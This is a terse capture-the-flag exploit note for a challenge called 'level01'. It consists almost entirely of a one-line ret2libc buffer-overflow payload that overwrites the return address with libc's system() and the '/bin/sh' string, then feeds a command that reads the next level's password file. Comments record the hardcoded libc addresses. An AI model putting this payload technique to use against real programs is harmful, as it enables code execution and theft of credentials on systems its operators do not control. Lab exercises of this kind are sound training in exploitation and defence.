#                                                        address of system    return of system     "/bin/sh" in the libc
./level01 < <(python -c 'print("dat_wil\n" + "*" * 80 + "\xd0\xae\xe6\xf7" + "\x00\x00\x00\x00" + "\xec\x97\xf8\xf7" + "o" * 3996 + "cat /home/users/level02/.pass\n")')
#                                                         0xf7e6aed0          0x0                  0xf7f897ec
# 0xffffd5c0


# system 0xf7e6aed0
# address of /bin/sh in libc: 0xf7f897ec
# address of exit() 0xf7e5eb70
# address of printf() 0xf7e78480